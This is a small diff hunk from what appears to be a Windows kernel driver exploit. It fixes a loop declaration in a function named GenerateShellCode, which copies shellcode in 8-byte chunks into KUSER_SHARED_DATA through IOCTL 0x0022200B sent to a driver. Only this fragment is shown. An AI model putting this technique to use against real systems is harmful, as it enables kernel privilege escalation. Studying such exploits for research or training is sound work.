@@ -324,7 +324,7 @@ void *GenerateShellCode(HANDLE driverHandle)
     RtlMoveMemory(shellcode,payload,oldPayloadSize);
 
 
-    for (int = 0; i < payloadSizeInEight;i+=8)
+    for (int i = 0; i < payloadSizeInEight;i+=8)
     {
         SendToDriver(driverHandle,0x0022200B,(void*)shellcode+i,(void*)KUSER_SHARED_DATA+i);
     }
